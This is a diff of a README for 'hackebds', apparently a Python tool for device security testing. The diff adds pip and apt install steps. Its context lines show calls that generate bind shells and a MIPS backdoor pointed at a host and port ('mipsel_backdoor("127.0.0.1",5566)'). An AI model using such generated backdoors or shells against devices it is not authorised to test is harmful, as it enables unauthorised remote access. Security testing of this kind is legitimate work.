@@ -17,6 +17,7 @@ This tool is embedded in the security test of the device. There are two main fun
 ## install (1)  Highly recommended！！Because the source code compilation may not be updated in time，Please install the latest
 
 **pip install hackebds==0.1.5**
+**pip3 install -U hackebds**
 
 ```
 pip install hackebds==0.1.5
@@ -43,8 +44,13 @@ When importing this module will import the pwn module
 >>> x86_bind_shell(listen_port, passwd)
 >>> x64_bind_shell(listen_port, passwd)
 ```
-
+Please install the corresponding binutils environment before use
 expample:
+```
+apt search binutils | grep arm（You can replace it here）
+apt install binutils-arm-linux-gnueabi/hirsute
+```
+
 （Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
 ```
 >>> mipsel_backdoor("127.0.0.1",5566)
